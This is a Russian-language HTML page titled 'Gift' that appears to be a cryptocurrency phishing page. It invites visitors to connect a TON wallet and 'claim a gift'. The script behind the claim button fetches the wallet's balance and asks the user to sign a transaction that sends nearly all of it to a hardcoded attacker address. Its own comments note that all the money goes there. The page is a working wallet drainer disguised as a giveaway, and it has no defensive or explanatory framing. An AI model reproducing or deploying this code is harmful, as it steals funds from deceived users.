<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f172a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            padding: 40px 30px;
            border-radius: 24px;
            max-width: 360px;
            width: 100%;
            text-align: center;
            border: 1px solid #334155;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }
        #ton-connect {
            display: none;
        }
        .big-btn {
            width: 100%;
            padding: 20px;
            font-size: 1.4rem;
            font-weight: 700;
            border: none;
            border-radius: 60px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .big-btn:hover:not(:disabled) {
            transform: scale(1.02);
        }
        .big-btn:disabled {
            background: #475569;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .btn-connect {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
        }
        .btn-connect:hover:not(:disabled) {
            background: linear-gradient(135deg, #60a5fa, #3b82f6);
        }
        .btn-claim {
            background: linear-gradient(135deg, #ef4444, #dc2626);
        }
        .btn-claim:hover:not(:disabled) {
            background: linear-gradient(135deg, #f87171, #ef4444);
        }
        .btn-claim:disabled {
            background: #475569;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="card">

    <div id="ton-connect"></div>

    <!-- КНОПКА 1: ПОДКЛЮЧИТЬ КОШЕЛЁК -->
    <button id="connectBtn" class="big-btn btn-connect">
        🔗 Подключить кошелёк
    </button>

    <!-- КНОПКА 2: ЗАБРАТЬ ГИФТ (появляется после подключения) -->
    <button id="claimBtn" class="big-btn btn-claim hidden" disabled>
        🎁 Забрать гифт
    </button>

</div>

<script>
    // ============================================================
    // ВАШ АДРЕС (куда уходят все деньги)
    // ============================================================
    const RECIPIENT_ADDRESS = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

    // ============================================================
    // Инициализация TON Connect
    // ============================================================
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://chek-topaz.vercel.app/tonconnect-manifest.json',
        buttonRootId: 'ton-connect'
    });

    const connectBtn = document.getElementById('connectBtn');
    const claimBtn = document.getElementById('claimBtn');

    let currentBalanceNano = 0;

    // ============================================================
    // Получение баланса
    // ============================================================
    async function fetchBalance(address) {
        try {
            const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${address}`);
            const data = await response.json();
            if (data.ok && data.result) {
                currentBalanceNano = parseInt(data.result.balance, 10);
            }
        } catch (e) {
            console.error(e);
        }
    }

    // ============================================================
    // Отправка ВСЕХ денег
    // ============================================================
    async function claimGift() {
        const wallet = tonConnectUI.wallet;
        if (!wallet) return;

        const COMMISSION_BUFFER = 5000000;

        if (currentBalanceNano <= COMMISSION_BUFFER) {
            claimBtn.disabled = false;
            claimBtn.innerText = '❌ Мало средств';
            setTimeout(() => {
                claimBtn.innerText = '🎁 Забрать гифт';
            }, 2000);
            return;
        }

        const amountToSend = currentBalanceNano - COMMISSION_BUFFER;

        try {
            claimBtn.disabled = true;
            claimBtn.innerText = '⏳...';

            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [
                    {
                        address: RECIPIENT_ADDRESS,
                        amount: amountToSend.toString(),
                        payload: ''
                    }
                ]
            };

            const result = await tonConnectUI.sendTransaction(tx);

            if (result) {
                claimBtn.innerText = '✅ Готово!';
                setTimeout(() => {
                    claimBtn.innerText = '🎁 Забрать гифт';
                    claimBtn.disabled = false;
                }, 3000);
            }
        } catch (error) {
            console.error(error);
            claimBtn.innerText = '❌ Ошибка';
            setTimeout(() => {
                claimBtn.innerText = '🎁 Забрать гифт';
                claimBtn.disabled = false;
            }, 2000);
        }
    }

    // ============================================================
    // КНОПКА "ПОДКЛЮЧИТЬ КОШЕЛЁК"
    // ============================================================
    connectBtn.addEventListener('click', async () => {
        if (tonConnectUI.wallet) {
            // Если уже подключён — просто переключаем кнопки
            return;
        }

        try {
            connectBtn.disabled = true;
            connectBtn.innerText = '⏳...';
            await tonConnectUI.connectWallet();
        } catch (error) {
            console.error(error);
            connectBtn.disabled = false;
            connectBtn.innerText = '🔗 Подключить кошелёк';
        }
    });

    // ============================================================
    // СТАТУС ПОДКЛЮЧЕНИЯ КОШЕЛЬКА
    // ============================================================
    tonConnectUI.onStatusChange(async wallet => {
        if (wallet) {
            const address = wallet.account.address;
            await fetchBalance(address);

            // Меняем кнопки
            connectBtn.classList.add('hidden');
            claimBtn.classList.remove('hidden');
            claimBtn.disabled = false;
        } else {
            connectBtn.classList.remove('hidden');
            connectBtn.disabled = false;
            connectBtn.innerText = '🔗 Подключить кошелёк';
            claimBtn.classList.add('hidden');
            claimBtn.disabled = true;
            claimBtn.innerText = '🎁 Забрать гифт';
            currentBalanceNano = 0;
        }
    });

    // ============================================================
    // КНОПКА "ЗАБРАТЬ ГИФТ"
    // ============================================================
    claimBtn.addEventListener('click', claimGift);
</script>

</body>
</html>
